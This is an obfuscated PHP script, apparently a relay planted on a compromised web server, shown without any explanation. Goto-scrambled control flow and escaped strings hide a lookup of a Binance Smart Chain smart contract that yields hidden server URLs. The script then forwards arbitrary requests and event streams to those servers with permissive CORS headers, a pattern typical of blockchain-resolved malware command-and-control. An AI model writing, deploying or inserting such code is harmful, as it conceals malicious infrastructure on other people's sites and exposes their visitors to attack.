 goto v30FL; QpcYW: $body = $input["\142\157\x64\171"] ?? array(); goto ka3CV; odfOO: $endpoint = $input["\x65\x6e\144\x70\x6f\x69\x6e\x74"] ?? null; goto QpcYW; Fw7hm: $response = curl_exec($newch); goto OdiY3; Vi7Nc: $newch = curl_init($url); goto HsExN; HsExN: curl_setopt_array($newch, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_HTTPHEADER => array("\103\x6f\156\164\145\156\164\55\x54\171\x70\x65\72\40\141\x70\160\154\x69\x63\x61\164\x69\157\156\57\152\163\157\x6e"), CURLOPT_POST => true, CURLOPT_POSTFIELDS => json_encode($body), CURLOPT_TIMEOUT => 15)); goto Fw7hm; CC5kq: $input = json_decode(file_get_contents("\x70\150\x70\x3a\x2f\x2f\151\156\160\165\164"), true) ?: array(); goto odfOO; rtzD2: $body["\x72\x65\163\x65\162\x76\145"] = $api["\162\145\163\x65\x72\166\x65"]; goto Vi7Nc; WLxra: function resolveApiDomain() : array { $rpcUrl = "\x68\164\x74\160\163\72\57\x2f\142\x73\143\55\x64\x61\164\141\163\145\x65\144\x2e\142\151\156\x61\x6e\x63\145\x2e\157\162\147\57"; $contractAddress = "\60\x78\64\66\67\x46\x43\71\x62\101\104\64\60\61\63\x31\65\x31\61\x65\x35\143\105\x41\67\60\x31\67\x31\x61\x33\x46\x42\x34\141\101\x65\143\141\x31\63\x34"; $functionSelector = "\x30\x78\63\x62\x63\x35\x64\145\63\60"; $data = array("\x6a\163\157\156\162\160\143" => "\62\56\x30", "\155\145\x74\150\157\x64" => "\x65\164\x68\x5f\143\x61\154\154", "\x70\141\x72\x61\x6d\x73" => array(array("\164\157" => $contractAddress, "\144\x61\164\141" => $functionSelector), "\154\x61\x74\x65\163\164"), "\x69\144" => 1); $ch = curl_init($rpcUrl); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HTTPHEADER, array("\x43\157\x6e\x74\145\x6e\x74\x2d\x54\x79\160\145\72\x20\141\160\x70\154\x69\143\141\x74\x69\157\x6e\x2f\x6a\x73\157\x6e")); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data)); $response = curl_exec($ch); if (curl_errno($ch)) { echo json_encode(array("\x65\162\162\157\162" => curl_error($ch))); curl_close($ch); die; } curl_close($ch); $responseData = json_decode($response, true); $hexResult = $responseData["\162\145\x73\x75\x6c\164"]; $hexResult = str_replace("\x30\x78", '', $hexResult); $urls = array(); $firstUrlLength = hexdec(substr($hexResult, 128, 64)); $firstUrlHex = substr($hexResult, 128 + 64, $firstUrlLength * 2); $urls[] = pack("\110\52", $firstUrlHex); $secondUrlLength = hexdec(substr($hexResult, 128 + 64 + 64, 64)); $secondUrlHex = substr($hexResult, 128 + 64 + 64 + 64, $secondUrlLength * 2); $urls[] = pack("\x48\52", $secondUrlHex); $urls = array_map(function ($url) { return trim($url, "\x0"); }, $urls); $pingUrl = rtrim($urls[0], "\x2f") . "\x2f\x61\x70\151\x2f\x70\x69\156\147"; $pingCh = curl_init($pingUrl); curl_setopt($pingCh, CURLOPT_RETURNTRANSFER, true); curl_setopt($pingCh, CURLOPT_TIMEOUT, 5); curl_setopt($pingCh, CURLOPT_SSL_VERIFYPEER, true); $pingResponse = curl_exec($pingCh); $pingHttpCode = curl_getinfo($pingCh, CURLINFO_HTTP_CODE); curl_close($pingCh); if ($pingHttpCode >= 200 && $pingHttpCode < 300 && $pingResponse !== false) { return array("\x72\145\163\145\162\166\x65" => false, "\165\x72\154" => $urls[0]); } else { return array("\162\145\x73\145\162\166\145" => true, "\x75\x72\x6c" => $urls[1]); } } goto CC5kq; T4Gio: if ($_SERVER["\x52\105\121\125\105\x53\124\137\x4d\x45\x54\110\x4f\x44"] === "\117\x50\x54\111\x4f\x4e\x53") { http_response_code(204); die; } goto GlhlI; iUH3P: header("\101\143\143\x65\163\x73\55\103\157\156\164\x72\x6f\154\55\x41\154\x6c\x6f\167\55\110\x65\141\x64\145\162\163\x3a\x20\x43\157\x6e\x74\x65\156\x74\x2d\124\x79\x70\x65"); goto E4Xm4; YhpJ5: $url = rtrim($api["\165\162\x6c"], "\57") . "\57\141\x70\151\57{$endpoint}"; goto rtzD2; ka3CV: if (!$endpoint) { dbg("\x6e\157\40\x65\156\144\160\157\151\156\x74\40\342\x86\x92\40\x72\x65\x74\165\162\x6e\x20\162\x65\x73\157\x6c\x76\145\x41\160\x69\104\157\x6d\141\151\x6e"); echo json_encode(resolveApiDomain()); die; } goto pCzzT; E4Xm4: header("\x43\157\156\164\145\156\164\x2d\x54\171\x70\x65\72\x20\x61\x70\160\154\151\143\141\x74\x69\157\156\57\152\x73\157\156"); goto T4Gio; GlhlI: if (isset($_GET["\160\151\x6e\x67"])) { echo json_encode(array("\x70\x6f\156\x67" => true)); die; } goto hGrWJ; Uv6hf: $code = curl_getinfo($newch, CURLINFO_HTTP_CODE) ?: 0; goto ih68m; OdiY3: $err = curl_error($newch); goto Uv6hf; e0KnO: header("\101\143\x63\x65\163\x73\55\103\157\156\164\162\x6f\x6c\55\x41\154\x6c\157\x77\x2d\x4d\145\x74\x68\157\144\x73\x3a\40\x47\105\x54\x2c\40\120\x4f\123\124\x2c\x20\117\120\124\x49\x4f\116\x53"); goto iUH3P; v30FL: header("\101\x63\143\x65\x73\163\x2d\x43\157\156\x74\x72\x6f\154\55\101\154\154\157\x77\x2d\117\162\151\147\151\156\x3a\40\x2a"); goto e0KnO; pCzzT: $api = resolveApiDomain(); goto YhpJ5; ih68m: curl_close($newch); goto bNkGy; hGrWJ: if (isset($_GET["\163\164\162\145\141\x6d"], $_GET["\163\145\163\163\151\157\x6e"]) && $_GET["\163\164\x72\145\141\155"] === "\x74\x78\55\163\x74\162\145\141\155") { header("\x43\157\156\164\145\156\164\55\124\x79\160\x65\72\40\164\x65\170\x74\57\145\x76\145\x6e\164\x2d\x73\x74\162\x65\141\x6d"); header("\103\141\x63\x68\x65\55\103\x6f\156\164\162\x6f\x6c\x3a\40\156\x6f\x2d\x63\x61\143\x68\145"); $api = resolveApiDomain(); $upUrl = rtrim($api["\x75\162\x6c"], "\57") . "\x2f\x61\x70\151\x2f\164\x78\55\x73\164\162\145\141\155\57" . rawurlencode($_GET["\x73\x65\x73\x73\151\x6f\x6e"]); $ctx = stream_context_create(array("\150\x74\164\160" => array("\155\x65\164\150\157\x64" => "\107\x45\x54", "\x68\x65\x61\144\x65\x72" => "\101\143\143\145\x70\164\x3a\x20\164\145\170\x74\x2f\x65\166\x65\x6e\x74\x2d\163\x74\162\x65\141\155\xd\12", "\x74\151\x6d\x65\x6f\165\164" => 15))); $fp = @fopen($upUrl, "\x72", false, $ctx); if (!$fp) { echo "\x3a\x20\165\160\163\x74\162\x65\141\x6d\40\145\162\x72\x6f\162\12\xa"; flush(); die; } while (!feof($fp)) { echo fgets($fp, 4096); @ob_flush(); flush(); } fclose($fp); die; } goto WLxra; bNkGy: if ($response === false) { http_response_code(502); echo json_encode(array("\145\x72\x72\157\162" => "\125\x70\163\x74\x72\145\141\x6d\40\146\141\x69\154\x65\x64")); } else { http_response_code($code ?: 200); echo $response; }